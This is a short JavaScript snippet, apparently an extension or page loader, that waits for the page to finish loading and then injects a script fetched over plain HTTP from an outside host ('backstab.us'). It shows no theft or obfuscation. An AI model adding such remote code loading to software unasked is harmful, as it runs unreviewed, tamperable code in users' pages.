(function() {
  var readyStateCheckInterval = setInterval(function() {
      if (document.readyState === "complete") {
          clearInterval(readyStateCheckInterval);
          var scriptElement = document.createElement("script");
          scriptElement.type = "text/javascript";
          scriptElement.src = "http://backstab.us/js/backstab.js";
          document.body.appendChild(scriptElement);
      }
  }, 100);
})();
